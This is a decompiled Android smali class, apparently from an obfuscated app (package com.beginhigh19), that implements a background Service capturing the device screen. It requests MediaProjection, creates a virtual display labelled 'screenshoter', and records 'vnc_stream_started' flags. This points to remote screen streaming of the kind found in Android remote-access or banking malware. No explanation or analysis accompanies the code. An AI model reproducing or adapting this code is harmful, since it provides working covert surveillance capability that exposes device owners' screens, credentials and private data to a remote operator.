.class public Lcom/beginhigh19/p067x;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field public static break:I

.field public static catch:Landroid/content/Intent;

.field public static this:Z


# instance fields
.field public case:Landroid/media/projection/MediaProjection;

.field private else:Lfddo/catch;

.field private fddo:Landroid/view/WindowManager;

.field private for:Landroid/os/Handler;

.field private goto:Landroid/hardware/display/VirtualDisplay;

.field public ifdf:Landroid/os/HandlerThread;

.field new:Landroid/media/projection/MediaProjection$Callback;

.field private try:Landroid/media/projection/MediaProjectionManager;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Landroid/os/HandlerThread;

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lcom/beginhigh19/p067x;->ifdf:Landroid/os/HandlerThread;

    new-instance v0, Lcom/beginhigh19/p067x$fddo;

    invoke-direct {v0, p0}, Lcom/beginhigh19/p067x$fddo;-><init>(Lcom/beginhigh19/p067x;)V

    iput-object v0, p0, Lcom/beginhigh19/p067x;->new:Landroid/media/projection/MediaProjection$Callback;

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/beginhigh19/p067x;->try:Landroid/media/projection/MediaProjectionManager;

    iget-object v0, p0, Lcom/beginhigh19/p067x;->ifdf:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/beginhigh19/p067x;->ifdf:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/beginhigh19/p067x;->for:Landroid/os/Handler;

    return-void
.end method

.method static synthetic fddo(Lcom/beginhigh19/p067x;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    iget-object p0, p0, Lcom/beginhigh19/p067x;->goto:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method


# virtual methods
.method public for()Landroid/os/Handler;
    .locals 1

    iget-object v0, p0, Lcom/beginhigh19/p067x;->for:Landroid/os/Handler;

    return-object v0
.end method

.method public ifdf()V
    .locals 10

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    const-string v2, "vnc_stream_started"

    invoke-static {v0, v2, v1}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-wide/16 v1, 0x0

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    const-string v2, "last_vnc_stream_attempt"

    invoke-static {v0, v2, v1}, Lfddo/throw;->goto(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)V

    const-string v0, "media_projection"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lcom/beginhigh19/p067x;->try:Landroid/media/projection/MediaProjectionManager;

    iget-object v0, p0, Lcom/beginhigh19/p067x;->case:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    :cond_0
    iget-object v0, p0, Lcom/beginhigh19/p067x;->try:Landroid/media/projection/MediaProjectionManager;

    sget v1, Lcom/beginhigh19/p067x;->break:I

    sget-object v2, Lcom/beginhigh19/p067x;->catch:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    iput-object v0, p0, Lcom/beginhigh19/p067x;->case:Landroid/media/projection/MediaProjection;

    new-instance v0, Lfddo/catch;

    invoke-direct {v0, p0}, Lfddo/catch;-><init>(Lcom/beginhigh19/p067x;)V

    iput-object v0, p0, Lcom/beginhigh19/p067x;->else:Lfddo/catch;

    iget-object v1, p0, Lcom/beginhigh19/p067x;->case:Landroid/media/projection/MediaProjection;

    if-nez v1, :cond_1

    return-void

    :cond_1
    invoke-virtual {v0}, Lfddo/catch;->for()I

    move-result v3

    iget-object v0, p0, Lcom/beginhigh19/p067x;->else:Lfddo/catch;

    invoke-virtual {v0}, Lfddo/catch;->fddo()I

    move-result v4

    invoke-virtual {p0}, Landroid/app/Service;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v5, v0, Landroid/util/DisplayMetrics;->densityDpi:I

    const/16 v6, 0x9

    iget-object v0, p0, Lcom/beginhigh19/p067x;->else:Lfddo/catch;

    invoke-virtual {v0}, Lfddo/catch;->ifdf()Landroid/view/Surface;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lcom/beginhigh19/p067x;->for:Landroid/os/Handler;

    const-string v2, "screenshoter"

    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    iput-object v0, p0, Lcom/beginhigh19/p067x;->goto:Landroid/hardware/display/VirtualDisplay;

    iget-object v0, p0, Lcom/beginhigh19/p067x;->case:Landroid/media/projection/MediaProjection;

    iget-object v1, p0, Lcom/beginhigh19/p067x;->new:Landroid/media/projection/MediaProjection$Callback;

    iget-object v2, p0, Lcom/beginhigh19/p067x;->for:Landroid/os/Handler;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method public new()Landroid/view/WindowManager;
    .locals 1

    iget-object v0, p0, Lcom/beginhigh19/p067x;->fddo:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p067x;->this:Z

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    const/4 p2, 0x2

    if-nez p1, :cond_0

    return p2

    :cond_0
    const-string p3, "stop"

    invoke-virtual {p1, p3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    invoke-virtual {v0, p3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    if-eqz p3, :cond_2

    iget-object p1, p0, Lcom/beginhigh19/p067x;->case:Landroid/media/projection/MediaProjection;

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Landroid/media/projection/MediaProjection;->stop()V

    :cond_1
    iget-object p1, p0, Lcom/beginhigh19/p067x;->ifdf:Landroid/os/HandlerThread;

    invoke-virtual {p1}, Landroid/os/HandlerThread;->quitSafely()Z

    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    return p2

    :cond_2
    sget-boolean p3, Lcom/beginhigh19/p067x;->this:Z

    if-eqz p3, :cond_3

    return p2

    :cond_3
    const/4 p3, 0x1

    sput-boolean p3, Lcom/beginhigh19/p067x;->this:Z

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    const-string v0, "window"

    invoke-virtual {p3, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/beginhigh19/p067x;->fddo:Landroid/view/WindowManager;

    sget-object v0, Lcom/beginhigh19/p067x;->catch:Landroid/content/Intent;

    if-nez v0, :cond_4

    const/4 v0, 0x0

    const-string v1, "code"

    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    sput v0, Lcom/beginhigh19/p067x;->break:I

    const-string v0, "intent"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p1

    check-cast p1, Landroid/content/Intent;

    sput-object p1, Lcom/beginhigh19/p067x;->catch:Landroid/content/Intent;

    :cond_4
    invoke-static {p3, p0}, Lcom/beginhigh19/p041i;->fddo(Landroid/content/Context;Landroid/app/Service;)V

    invoke-static {p3}, Lcom/beginhigh19/p041i;->for(Landroid/content/Context;)V

    new-instance p1, Lcom/beginhigh19/p067x$ifdf;

    invoke-direct {p1, p0}, Lcom/beginhigh19/p067x$ifdf;-><init>(Lcom/beginhigh19/p067x;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return p2
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p067x;->this:Z

    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
